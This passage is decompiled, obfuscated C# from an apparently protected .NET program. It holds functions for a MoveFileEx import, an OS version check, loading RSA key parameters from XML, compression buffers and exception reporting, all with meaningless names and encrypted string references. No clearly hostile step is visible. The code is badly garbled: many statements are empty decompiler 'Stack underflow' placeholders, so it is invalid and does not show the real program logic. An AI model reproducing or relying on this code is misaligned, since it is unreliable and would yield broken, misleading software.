			/*Error near IL_0024: Stack underflow*/((string)/*Error near IL_0024: Stack underflow*/, (string)/*Error near IL_0024: Stack underflow*/);
			return (string)/*Error near IL_0011: Stack underflow*/;
		}

		static bool _0001(_0007 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static void _0001(IntPtr P_0, RawSecurityDescriptor P_1)
		{
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 2
			//IL_005b: Incompatible stack heights: 0 vs 1
			byte[] array = default(byte[]);
			try
			{
				while (true)
				{
					_ = global::_0001._007E_0014;
					/*Error near IL_003e: Stack underflow*/((object)/*Error near IL_003e: Stack underflow*/);
					if (4 == 0)
					{
						break;
					}
					array = new byte[/*Error near IL_0011: Stack underflow*/];
					_ = _0094_0003._007E_008B_0006;
					/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/, (byte[])/*Error near IL_004e: Stack underflow*/, 0);
					if (uint.MaxValue != 0)
					{
						_ = 4;
						_0011._0001((IntPtr)/*Error near IL_005b: Stack underflow*/, (int)/*Error near IL_005b: Stack underflow*/, (byte[])/*Error near IL_005b: Stack underflow*/);
						break;
					}
				}
				if ((int)/*Error near IL_002b: Stack underflow*/ == 0 || 4 == 0)
				{
					throw new Win32Exception();
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)array, (object)(nint)P_0, (object)P_1);
				throw;
			}
		}

		static object _0001(global::_0004._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0004._0005)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static void _0001(_0006 P_0)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((_0006)/*Error near IL_0008: Stack underflow*/)._0001 = true;
		}

		static void _0001(Exception P_0, object P_1, object P_2)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 4
			//IL_001f: Incompatible stack heights: 0 vs 3
			_ = new object[2];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
			if (0 == 0)
			{
				_0011._0001((Exception)/*Error near IL_0026: Stack underflow*/, (object[])/*Error near IL_0026: Stack underflow*/);
			}
		}

		unsafe static int _0001(global::_0002._0005 P_0, string P_1)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_0061: Invalid comparison between Unknown and I4
			//IL_0147: Incompatible stack heights: 0 vs 1
			//IL_014d: Incompatible stack heights: 0 vs 2
			//IL_0153: Incompatible stack heights: 0 vs 1
			//IL_0159: Incompatible stack heights: 0 vs 2
			//IL_0163: Incompatible stack heights: 0 vs 1
			//IL_0169: Incompatible stack heights: 0 vs 1
			//IL_016f: Incompatible stack heights: 0 vs 2
			//IL_0179: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[18];
			try
			{
				_ = /*Error near IL_0012: Stack underflow*/+ 16;
				char num = ((global::_0002._0005)/*Error near IL_001c: Stack underflow*/)._0001[0];
				*(bool*)(nint)/*Error near IL_0022: Stack underflow*/ = num == '\u0001';
				int num2;
				if (4u != 0)
				{
					if ((int)/*Error near IL_002c: Stack underflow*/ != 0)
					{
						_ = global::_0001._007E_0001;
						/*Error near IL_0163: Stack underflow*/((object)/*Error near IL_0163: Stack underflow*/);
						if ((int)/*Error near IL_003d: Stack underflow*/ != 0)
						{
							if (false)
							{
								goto IL_0134;
							}
							num2 = *(sbyte*)(nint)(/*Error near IL_0048: Stack underflow*/ + 16);
							if (8 == 0)
							{
								goto IL_010f;
							}
							if (num2 != 0)
							{
								_ = global::_0001._007E_0001;
								/*Error near IL_0179: Stack underflow*/((object)/*Error near IL_0179: Stack underflow*/);
								if ((int)/*Error near IL_0063: Stack underflow*/ > 4)
								{
									goto IL_007a;
								}
							}
							if (((byte*)ptr)[16] != 0 || global::_0003._007E_0018(P_1, 0) == '#')
							{
								goto IL_0087;
							}
						}
					}
					goto IL_007a;
				}
				goto IL_008a;
				IL_008a:
				*(int*)((byte*)ptr + 8) = global::_0001._007E_0001(P_1) - 1;
				goto IL_0134;
				IL_010f:
				nint num3 = (nint)P_0._0001.LongLength;
				do
				{
					num3 = (int)num3;
				}
				while (5 == 0);
				char c = default(char);
				if (num2 < num3)
				{
					if (P_0._0001[*(int*)((byte*)ptr + 12)] != c)
					{
						(*(int*)((byte*)ptr + 12))++;
						goto IL_010a;
					}
					*(int*)ptr = *(int*)ptr * P_0._0001.Length + *(int*)((byte*)ptr + 12);
					((byte*)ptr)[17] = 1;
				}
				if (((byte*)ptr)[17] != 0)
				{
					(*(int*)((byte*)ptr + 8))--;
					goto IL_0134;
				}
				*(int*)((byte*)ptr + 4) = -1;
				goto end_IL_000a;
				IL_007a:
				if (false)
				{
					goto IL_0087;
				}
				*(int*)((byte*)ptr + 4) = -1;
				goto end_IL_000a;
				IL_010a:
				num2 = *(int*)((byte*)ptr + 12);
				goto IL_010f;
				IL_0087:
				*(int*)ptr = 0;
				goto IL_008a;
				IL_0134:
				while (true)
				{
					if (*(int*)((byte*)ptr + 8) >= 0)
					{
						if (5u != 0)
						{
							if (((byte*)ptr)[16] == 0 && *(int*)((byte*)ptr + 8) == 0)
							{
								goto IL_013e;
							}
							c = global::_0003._007E_0018(P_1, *(int*)((byte*)ptr + 8));
							((byte*)ptr)[17] = 0;
						}
						*(int*)((byte*)ptr + 12) = 0;
						if (false)
						{
							continue;
						}
						goto IL_010a;
					}
					goto IL_013e;
					IL_013e:
					*(int*)((byte*)ptr + 4) = *(int*)ptr;
					break;
				}
				end_IL_000a:;
			}
			catch
			{
				*(int*)((byte*)ptr + 4) = -1;
			}
			return *(int*)((byte*)ptr + 4);
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4, object P_5, object P_6, object P_7, object P_8, object P_9, object P_10)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 4
			//IL_004f: Incompatible stack heights: 0 vs 3
			//IL_0052: Incompatible stack heights: 0 vs 3
			//IL_0056: Incompatible stack heights: 0 vs 3
			//IL_005a: Incompatible stack heights: 0 vs 3
			//IL_005e: Incompatible stack heights: 0 vs 3
			//IL_0062: Incompatible stack heights: 0 vs 3
			//IL_0066: Incompatible stack heights: 0 vs 3
			if (0 == 0 && 4u != 0)
			{
				_ = new object[10];
				_ = 0;
				((object[])/*Error near IL_0014: Stack underflow*/)[/*Error near IL_0014: Stack underflow*/] = (object)/*Error near IL_0014: Stack underflow*/;
				/*Error near IL_0014: Stack underflow*/;
				_ = 1;
				((object[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/] = (object)/*Error near IL_0019: Stack underflow*/;
				/*Error near IL_0019: Stack underflow*/;
				_ = 2;
				((object[])/*Error near IL_001e: Stack underflow*/)[/*Error near IL_001e: Stack underflow*/] = (object)/*Error near IL_001e: Stack underflow*/;
				/*Error near IL_001e: Stack underflow*/;
				_ = 3;
				((object[])/*Error near IL_0023: Stack underflow*/)[/*Error near IL_0023: Stack underflow*/] = (object)/*Error near IL_0023: Stack underflow*/;
				/*Error near IL_0023: Stack underflow*/;
				_ = 4;
				((object[])/*Error near IL_0028: Stack underflow*/)[/*Error near IL_0028: Stack underflow*/] = (object)/*Error near IL_0028: Stack underflow*/;
				/*Error near IL_0028: Stack underflow*/;
				_ = 5;
				((object[])/*Error near IL_002d: Stack underflow*/)[/*Error near IL_002d: Stack underflow*/] = (object)/*Error near IL_002d: Stack underflow*/;
				/*Error near IL_002d: Stack underflow*/;
				_ = 6;
				((object[])/*Error near IL_0032: Stack underflow*/)[/*Error near IL_0032: Stack underflow*/] = (object)/*Error near IL_0032: Stack underflow*/;
				/*Error near IL_0032: Stack underflow*/;
				_ = 7;
				((object[])/*Error near IL_0037: Stack underflow*/)[/*Error near IL_0037: Stack underflow*/] = (object)/*Error near IL_0037: Stack underflow*/;
				((object[])/*Error near IL_0037: Stack underflow*/)[8] = P_9;
				((object[])/*Error near IL_003c: Stack underflow*/)[9] = P_10;
				_0011._0001((Exception)/*Error near IL_0047: Stack underflow*/, (object[])/*Error near IL_0047: Stack underflow*/);
			}
		}

		static void _0001(global::_0008._0004._0007._0001 P_0, int P_1)
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 2
			//IL_0043: Incompatible stack heights: 0 vs 2
			try
			{
				do
				{
					if (uint.MaxValue != 0)
					{
						_ = ((global::_0008._0004._0007._0001)/*Error near IL_000a: Stack underflow*/)._0001._0001;
						_ = ((global::_0008._0004._0007._0001)/*Error near IL_0016: Stack underflow*/)._0002;
						_ = ((short[])/*Error near IL_0019: Stack underflow*/)[/*Error near IL_0019: Stack underflow*/] & 0xFFFF;
						_ = ((global::_0008._0004._0007._0001)/*Error near IL_0026: Stack underflow*/)._0001;
						byte num = ((byte[])/*Error near IL_0029: Stack underflow*/)[/*Error near IL_0029: Stack underflow*/];
						_0011._0001((global::_0008._0004._000E)/*Error near IL_004a: Stack underflow*/, (int)/*Error near IL_004a: Stack underflow*/, (int)num);
					}
				}
				while (false || false || -1 == 0);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0, (object)P_1);
				throw;
			}
		}

		[DllImport("kernel32", EntryPoint = "MoveFileEx")]
		static extern bool _0001(string _0002, string _0003, int _0004);

		unsafe static bool _0001(string P_0)
		{
			//IL_0077: Incompatible stack heights: 0 vs 5
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 5
			//IL_0091: Incompatible stack heights: 0 vs 1
			//IL_0098: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[2];
			global::_0008._0002 obj = default(global::_0008._0002);
			global::_0002._0003 obj3 = default(global::_0002._0003);
			try
			{
				_ = global::_0010._0003._0003;
				_ = 0;
				_ = 131097;
				_ = global::_0004._0019;
				global::_000E._0003._0001(107391112);
				/*Error near IL_0084: Stack underflow*/((string)/*Error near IL_0084: Stack underflow*/, (string)/*Error near IL_0084: Stack underflow*/);
				global::_0002._0003 obj2 = _0011._0001((UIntPtr)/*Error near IL_002b: Stack underflow*/, (global::_0008._0003)/*Error near IL_002b: Stack underflow*/, (global::_0001._0005)/*Error near IL_002b: Stack underflow*/, (string)/*Error near IL_002b: Stack underflow*/, out obj);
				if (obj2 == null)
				{
					_ = global::_0010._0003._0003;
					_ = 0;
					_ = 131097;
					_ = global::_0004._0019;
					global::_000E._0003._0001(107391051);
					/*Error near IL_0098: Stack underflow*/((string)/*Error near IL_0098: Stack underflow*/, (string)/*Error near IL_0098: Stack underflow*/);
					obj2 = _0011._0001((UIntPtr)/*Error near IL_009f: Stack underflow*/, (global::_0008._0003)/*Error near IL_009f: Stack underflow*/, (global::_0001._0005)/*Error near IL_009f: Stack underflow*/, (string)/*Error near IL_009f: Stack underflow*/, out obj);
				}
				obj3 = obj2;
				try
				{
					*(bool*)ptr = obj == global::_0008._0002._0003;
				}
				finally
				{
					if (obj3 != null && 0 == 0)
					{
						global::_000F._007E_0099(obj3);
					}
				}
				((byte*)ptr)[1] = *(byte*)ptr;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)obj3, (object)obj, (object)(*(bool*)ptr), (object)P_0);
				throw;
			}
			return ((byte*)ptr)[1] != 0;
		}

		static void _0001(int P_0, byte[] P_1, int P_2, global::_0008._0004._000E P_3)
		{
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Expected I4, but got Unknown
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			//IL_003c: Incompatible stack heights: 0 vs 2
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 2
			try
			{
				_ = ((global::_0008._0004._000E)/*Error near IL_000b: Stack underflow*/)._0001;
				_ = ((global::_0008._0004._000E)/*Error near IL_0012: Stack underflow*/)._0002;
				if (0 == 0)
				{
					Array.Copy((Array)/*Error near IL_0043: Stack underflow*/, (int)/*Error near IL_0043: Stack underflow*/, (Array)/*Error near IL_0043: Stack underflow*/, (int)/*Error near IL_0043: Stack underflow*/, (int)/*Error near IL_0043: Stack underflow*/);
				}
				_ = ((global::_0008._0004._000E)/*Error near IL_0025: Stack underflow*/)._0002;
				_003F val = /*Error near IL_0028: Stack underflow*/+ /*Error near IL_0028: Stack underflow*/;
				((global::_0008._0004._000E)/*Error near IL_002d: Stack underflow*/)._0002 = (int)val;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_3, (object)P_1, (object)P_2, (object)P_0);
				throw;
			}
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4, object P_5, object P_6, object P_7, object P_8)
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 4
			//IL_003d: Incompatible stack heights: 0 vs 3
			//IL_0040: Incompatible stack heights: 0 vs 3
			//IL_0044: Incompatible stack heights: 0 vs 3
			//IL_0048: Incompatible stack heights: 0 vs 3
			//IL_004c: Incompatible stack heights: 0 vs 3
			//IL_0050: Incompatible stack heights: 0 vs 3
			//IL_0054: Incompatible stack heights: 0 vs 3
			_ = new object[8];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
			/*Error near IL_0012: Stack underflow*/;
			_ = 2;
			((object[])/*Error near IL_0017: Stack underflow*/)[/*Error near IL_0017: Stack underflow*/] = (object)/*Error near IL_0017: Stack underflow*/;
			/*Error near IL_0017: Stack underflow*/;
			_ = 3;
			((object[])/*Error near IL_001c: Stack underflow*/)[/*Error near IL_001c: Stack underflow*/] = (object)/*Error near IL_001c: Stack underflow*/;
			/*Error near IL_001c: Stack underflow*/;
			_ = 4;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = (object)/*Error near IL_0021: Stack underflow*/;
			/*Error near IL_0021: Stack underflow*/;
			_ = 5;
			((object[])/*Error near IL_0026: Stack underflow*/)[/*Error near IL_0026: Stack underflow*/] = (object)/*Error near IL_0026: Stack underflow*/;
			/*Error near IL_0026: Stack underflow*/;
			_ = 6;
			((object[])/*Error near IL_002b: Stack underflow*/)[/*Error near IL_002b: Stack underflow*/] = (object)/*Error near IL_002b: Stack underflow*/;
			/*Error near IL_002b: Stack underflow*/;
			_ = 7;
			((object[])/*Error near IL_0030: Stack underflow*/)[/*Error near IL_0030: Stack underflow*/] = (object)/*Error near IL_0030: Stack underflow*/;
			_0011._0001((Exception)/*Error near IL_0035: Stack underflow*/, (object[])/*Error near IL_0035: Stack underflow*/);
		}

		static void _0001(global::_0002._0005 P_0, Exception P_1)
		{
			//IL_0123: Incompatible stack heights: 0 vs 2
			//IL_012d: Incompatible stack heights: 0 vs 1
			//IL_0139: Incompatible stack heights: 0 vs 1
			//IL_013f: Incompatible stack heights: 0 vs 1
			//IL_0158: Incompatible stack heights: 0 vs 1
			//IL_0162: Incompatible stack heights: 0 vs 2
			//IL_016c: Incompatible stack heights: 0 vs 1
			_ = ((global::_0002._0005)/*Error near IL_000a: Stack underflow*/)._0001;
			global::_000E._0003._0001(107391006);
			new global::_0004._0007((XmlWriter)/*Error near IL_016c: Stack underflow*/, (string)/*Error near IL_016c: Stack underflow*/);
			global::_0004._0007 obj;
			if (7u != 0)
			{
				obj = (global::_0004._0007)/*Error near IL_0172: Stack underflow*/;
			}
			try
			{
				string text;
				if (8u != 0)
				{
					_ = _008F._007E_008C_0003;
					/*Error near IL_012d: Stack underflow*/((object)/*Error near IL_012d: Stack underflow*/);
					Type type = (Type)/*Error near IL_0133: Stack underflow*/;
					((global::_0002._0005)/*Error near IL_0046: Stack underflow*/)._0001((Type)/*Error near IL_0046: Stack underflow*/);
					text = global::_000E._0003._0001(107392221);
					try
					{
						text = global::_0007._007E_008D(P_1);
					}
					catch
					{
					}
				}
				_008E._007E_0086_0003(P_0._0001, global::_000E._0003._0001(107390993), text);
				string text2 = global::_0007._007E_0091(global::_0007._007E_0090(P_1));
				_008E._007E_0086_0003(P_0._0001, global::_000E._0003._0001(107391460), text2);
				int num = _0095_0003._007E_008C_0006(text2, ' ');
				text2 = _0096_0003._007E_008D_0006(text2, num + 1);
				num = _0097._007E_0096_0003(text2, global::_000E._0003._0001(107391431));
				if (num != -1)
				{
					text2 = _001C._007E_009B_0002(text2, 0, num);
				}
				_008E._007E_0086_0003(P_0._0001, global::_000E._0003._0001(107391426), text2);
				P_0._0001(new global::_0004._0005(P_1, true));
			}
			catch
			{
			}
			finally
			{
				if (obj != null)
				{
					global::_000F._007E_0099(obj);
				}
			}
		}

		static string _0001(global::_0008._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0008._0005)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static int _0001(global::_0008._0004._0003 P_0)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			try
			{
				do
				{
					int num = 32768;
					if (num != 0)
					{
						int num2 = ((global::_0008._0004._0003)/*Error near IL_000f: Stack underflow*/)._0002;
						num = /*Error near IL_0010: Stack underflow*/- num2;
					}
					int num3 = num;
				}
				while (false);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_0028: Stack underflow*/;
		}

		static bool _0001()
		{
			//IL_0023: Invalid comparison between Unknown and I4
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 1
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 1
			//IL_008a: Incompatible stack heights: 0 vs 1
			//IL_0091: Incompatible stack heights: 0 vs 1
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			if (0 == 0 && uint.MaxValue != 0)
			{
				_ = OsVersionInformation._0002.HasValue;
				if ((int)/*Error near IL_001b: Stack underflow*/ == 0)
				{
					try
					{
						_0098_0002._0084_0005();
						if ((int)/*Error near IL_0025: Stack underflow*/ != 8)
						{
							global::_000E._0003._0001(107391449);
							global::_000E._0003._0001(107391400);
							OsVersionInformation._001B_0094_0004_0002((string)/*Error near IL_0083: Stack underflow*/, (string)/*Error near IL_0083: Stack underflow*/);
							if ((int)/*Error near IL_0044: Stack underflow*/ == 0)
							{
								_ = 0;
								goto IL_0052;
							}
							OsVersionInformation._0008_000F_0005();
							OsVersionInformation._0094_0087_0084((IntPtr)/*Error near IL_0091: Stack underflow*/, out var _);
							goto IL_004a;
						}
						do
						{
							new bool?(true);
							OsVersionInformation._0002 = (bool?)/*Error near IL_002d: Stack underflow*/;
						}
						while (false);
						goto end_IL_001b;
						IL_0052:
						_ = /*Error near IL_0053: Stack underflow*/& /*Error near IL_0053: Stack underflow*/;
						if (false)
						{
							goto IL_004a;
						}
						OsVersionInformation._0002 = (byte)/*Error near IL_005b: Stack underflow*/ != 0;
						goto end_IL_001b;
						IL_004a:
						if (7 == 0)
						{
						}
						goto IL_0052;
						end_IL_001b:;
					}
					catch
					{
						OsVersionInformation._0002 = false;
					}
				}
			}
			return OsVersionInformation._0002.Value;
		}

		static void _0001(string P_0, RSACryptoServiceProvider P_1)
		{
			//IL_0394: Incompatible stack heights: 0 vs 1
			//IL_03a0: Incompatible stack heights: 0 vs 2
			//IL_03a6: Incompatible stack heights: 0 vs 1
			//IL_03b6: Incompatible stack heights: 0 vs 4
			//IL_03c0: Incompatible stack heights: 0 vs 1
			//IL_03ca: Incompatible stack heights: 0 vs 1
			//IL_03d4: Incompatible stack heights: 0 vs 1
			RSAParameters rSAParameters = default(RSAParameters);
			XmlDocument xmlDocument = default(XmlDocument);
			IEnumerator enumerator = default(IEnumerator);
			XmlNode xmlNode = default(XmlNode);
			string text = default(string);
			uint num = default(uint);
			IDisposable disposable = default(IDisposable);
			try
			{
				rSAParameters = default(RSAParameters);
				new XmlDocument();
				xmlDocument = (XmlDocument)/*Error near IL_039a: Stack underflow*/;
				_ = global::_0011._007E_0086_0002;
				/*Error near IL_03b0: Stack underflow*/((object)/*Error near IL_03b0: Stack underflow*/, (string)/*Error near IL_03b0: Stack underflow*/);
				_ = _000E_0002._007E_0016_0004;
				_ = global::_0007._007E_0092;
				_ = _0097_0003._007E_008E_0006;
				/*Error near IL_03c0: Stack underflow*/((object)/*Error near IL_03c0: Stack underflow*/);
				/*Error near IL_03ca: Stack underflow*/((object)/*Error near IL_03ca: Stack underflow*/);
				global::_000E._0003._0001(107391411);
				if (/*Error near IL_0053: Stack underflow*/((object)/*Error near IL_0053: Stack underflow*/, (string)/*Error near IL_0053: Stack underflow*/))
				{
					enumerator = _0004_0002._007E_0006_0004(_0098_0003._007E_008F_0006(_0097_0003._007E_008E_0006(xmlDocument)));
					try
					{
						while (_008D._007E_001B_0003(enumerator))
						{
							xmlNode = (XmlNode)_0005_0002._007E_0007_0004(enumerator);
							text = global::_0007._007E_0092(xmlNode);
							num = _0011._0001(text);
							int num2;
							uint num3;
							int num4;
							if (num <= 2183145318u)
							{
								if (num > 684613497)
								{
									goto IL_00d3;
								}
								if (num != 667835878)
								{
									if (num != 684613497)
									{
										continue;
									}
									goto IL_01b4;
								}
								if (false)
								{
									continue;
								}
								num2 = (global::_0008._0095(text, global::_000E._0003._0001(107391353)) ? 1 : 0);
								if (0 == 0)
								{
									if (num2 == 0)
									{
										continue;
									}
									rSAParameters.DQ = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
									if (8u != 0)
									{
										continue;
									}
									goto IL_0134;
								}
							}
							else
							{
								if (num > 3557560316u)
								{
									if (2 == 0)
									{
										goto IL_00d3;
									}
									num3 = num;
									num4 = -720629361;
									goto IL_0126;
								}
								num2 = (int)num;
							}
							if (num2 != -1056181741)
							{
								if (num != 3557560316u)
								{
									if (false)
									{
									}
								}
								else if (global::_0008._0095(text, global::_000E._0003._0001(107391331)))
								{
									rSAParameters.Q = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
								}
							}
							else if (0 == 0 && global::_0008._0095(text, global::_000E._0003._0001(107391303)))
							{
								rSAParameters.D = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
							}
							continue;
							IL_0126:
							if (num3 != (uint)num4)
							{
								if (num != 3883103162u)
								{
									continue;
								}
								goto IL_0134;
							}
							if (global::_0008._0095(text, global::_000E._0003._0001(107391336)))
							{
								rSAParameters.P = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
							}
							continue;
							IL_0134:
							if (global::_0008._0095(text, global::_000E._0003._0001(107391362)))
							{
								rSAParameters.Modulus = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
							}
							continue;
							IL_00d3:
							num3 = num;
							num4 = 1898057334;
							if (num4 == 0)
							{
								goto IL_0126;
							}
							if (num3 != (uint)num4)
							{
								if (num == 2183145318u && global::_0008._0095(text, global::_000E._0003._0001(107391381)))
								{
									rSAParameters.Exponent = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
								}
								continue;
							}
							if (0 == 0)
							{
								if (global::_0008._0095(text, global::_000E._0003._0001(107391348)))
								{
									rSAParameters.InverseQ = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
								}
								continue;
							}
							goto IL_01b4;
							IL_01b4:
							if (global::_0008._0095(text, global::_000E._0003._0001(107391358)))
							{
								rSAParameters.DP = _0019_0003._000E_0006(global::_0007._007E_0093(xmlNode));
							}
						}
					}
					finally
					{
						disposable = enumerator as IDisposable;
						if (disposable != null)
						{
							global::_000F._007E_0099(disposable);
						}
					}
					_0099_0003._007E_0090_0006(P_1, rSAParameters);
					return;
				}
				throw new Exception(global::_000E._0003._0001(107391298));
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)rSAParameters, (object)xmlDocument, (object)enumerator, (object)xmlNode, (object)text, (object)num, (object)disposable, (object)P_1, (object)P_0);
				throw;
			}
		}

		static bool _0001(_0006 P_0, string P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0045: Incompatible stack heights: 0 vs 1
			while (true)
			{
				_ = _0015._0092_0002;
				/*Error near IL_002e: Stack underflow*/((string)/*Error near IL_002e: Stack underflow*/);
				while (true)
				{
					if ((int)/*Error near IL_000b: Stack underflow*/ != 0)
					{
						_ = _009A_0003._0091_0006;
						/*Error near IL_0038: Stack underflow*/((string)/*Error near IL_0038: Stack underflow*/);
					}
					if (false)
					{
						break;
					}
					_ = ((_0006)/*Error near IL_001e: Stack underflow*/)._0001;
					_0011._0001((global::_0002._0005)/*Error near IL_0045: Stack underflow*/, (string)/*Error near IL_0045: Stack underflow*/);
					if (0 == 0)
					{
						return (byte)/*Error near IL_0026: Stack underflow*/ != 0;
					}
				}
			}
		}

		static void _0001(global::_0008._0004._0008 P_0)
		{
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f8: Incompatible stack heights: 0 vs 1
			//IL_00fe: Incompatible stack heights: 0 vs 1
			//IL_010e: Incompatible stack heights: 0 vs 2
			//IL_0114: Incompatible stack heights: 0 vs 2
			//IL_011a: Expected I4, but got Unknown
			//IL_0120: Incompatible stack heights: 0 vs 1
			//IL_0126: Incompatible stack heights: 0 vs 1
			//IL_012c: Incompatible stack heights: 0 vs 2
			int num3 = default(int);
			try
			{
				int num = ((global::_0008._0004._0008)/*Error near IL_000a: Stack underflow*/)._0005;
				int num2 = 65274;
				if (num2 == 0)
				{
					goto IL_0074;
				}
				if (num >= num2)
				{
					_0011._0001((global::_0008._0004._0008)/*Error near IL_0108: Stack underflow*/);
					if (false)
					{
						return;
					}
				}
				goto IL_00c5;
				IL_0076:
				Array.Copy(P_0._0002, P_0._0008, P_0._0001, P_0._0005 + P_0._0006, num3);
				P_0._0008 += num3;
				P_0._0007 += num3;
				P_0._0006 += num3;
				goto IL_00c5;
				IL_00c5:
				while (P_0._0006 >= 262 || P_0._0008 >= P_0._000E)
				{
					if (0 == 0)
					{
						if (P_0._0006 >= 3)
						{
							_0011._0001(P_0);
						}
						return;
					}
				}
				_ = 65536;
				int num4 = ((global::_0008._0004._0008)/*Error near IL_003b: Stack underflow*/)._0006;
				_ = /*Error near IL_003c: Stack underflow*/- num4;
				int num5 = ((global::_0008._0004._0008)/*Error near IL_0046: Stack underflow*/)._0005;
				num3 = /*Error near IL_0047: Stack underflow*/- num5;
				_ = ((global::_0008._0004._0008)/*Error near IL_005b: Stack underflow*/)._000E;
				int num6 = ((global::_0008._0004._0008)/*Error near IL_0065: Stack underflow*/)._0008;
				_003F val = /*Error near IL_0066: Stack underflow*/- num6;
				if (/*Error near IL_0068: Stack underflow*/ > val)
				{
					num = P_0._000E;
					num2 = P_0._0008;
					goto IL_0074;
				}
				goto IL_0076;
				IL_0074:
				num3 = num - num2;
				goto IL_0076;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num3, (object)P_0);
				throw;
			}
		}

		static ResourceManager _0001()
		{
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			try
			{
				while (global::_0010._0001._0001 == null)
				{
					if (0 == 0)
					{
						global::_000E._0003._0001(107391269);
						_ = _0093._007E_0091_0003;
						_001F._009E_0002(typeof(global::_0010._0001).TypeHandle);
						/*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/);
						new ResourceManager((string)/*Error near IL_004e: Stack underflow*/, (Assembly)/*Error near IL_004e: Stack underflow*/);
						global::_0010._0001._0001 = (ResourceManager)/*Error near IL_002b: Stack underflow*/;
						break;
					}
				}
				ResourceManager resourceManager = global::_0010._0001._0001;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
